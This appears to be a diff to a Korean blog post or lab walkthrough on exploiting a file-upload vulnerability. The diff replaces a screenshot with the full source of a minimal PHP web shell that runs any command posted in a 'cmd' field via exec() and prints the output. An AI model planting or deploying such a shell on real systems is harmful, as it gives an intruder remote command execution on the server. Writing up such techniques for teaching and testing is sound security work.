@@ -10,7 +10,19 @@
 그리고 URL을 보면 해당 사이트가 PHP를 사용하는 것을 알 수 있다.
 
 PHP로 웹셸을 작성 후  
-![Webshell Code](/img/file-upload-2.png)  
+```php
+<?php
+	$cmd = $_POST['cmd'];
+	if ( isset($cmd) ) { $x = exec("$cmd", $output); }
+	echo	"<form action='$_SERVER[PHP_SELF]' method='post'>".
+			"<input type='text' name='cmd'/>".
+			"</form><hr/><pre>";
+	foreach ($output as $o) {
+		echo $o."<br/>";
+	}
+	echo	"</pre>";
+?>
+```
 파일을 올리면
 
 ![Uplaod Path](/img/file-upload-3.png)  
